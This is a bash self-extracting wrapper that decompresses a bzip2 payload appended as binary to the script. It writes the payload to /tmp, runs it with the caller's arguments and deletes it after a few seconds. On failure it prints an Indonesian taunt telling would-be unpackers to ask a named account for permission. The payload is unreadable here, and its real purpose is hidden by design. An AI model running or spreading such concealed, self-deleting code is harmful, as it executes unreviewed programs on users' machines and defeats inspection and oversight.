#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SYfD�*  \߀ y�W?oߊ����Pv�D� �� 	� �    F�?Tz�Q�F�M4�10��6���� 1@�)&�����4�IꞦi=�l��2<���PE$S�{T���=C@h4� �'��~�3B�S����@i#B�2���A"�Z�:6E!����I�(܄�(Ӂ�Ch2������Dص�C���ga �"�����%���0��0�i�q��iq9�ﰯ�M�^΄:���Y'��f�kC�*4���R%�)��x�wm�l84��q����,iv:�C�9��c�02F���P��6�����I҆'N��x�?���� z��G4�
���.˃��L�p�
���`u��y�'i���C=�_?��t��:~������Ќ2:�M�(d�V����%Oa&�y��{�p48�Zk�u56�a@��A�����9�����-�&�iw9�n�šrl�k�q|Y����hd�rie(a�'K��z�7:]��hh��{�̑	T�:p���i���j.C&�Z��C3�2n9��v����#;�$@���q3J�b`a��p�%�bou����F�pb:ZL�0��X�>O[_�ֵ��}[�;�K��[\������2_G�����aR�U�j� ��3CCɀ�+c;0e����"�0�O���́���,
Y40��ܷ�	��6� @z7`��N�;�M[�#�5�kc@\�p3q���8^5s����M�a����~́���c�� j9��w$S�	dI��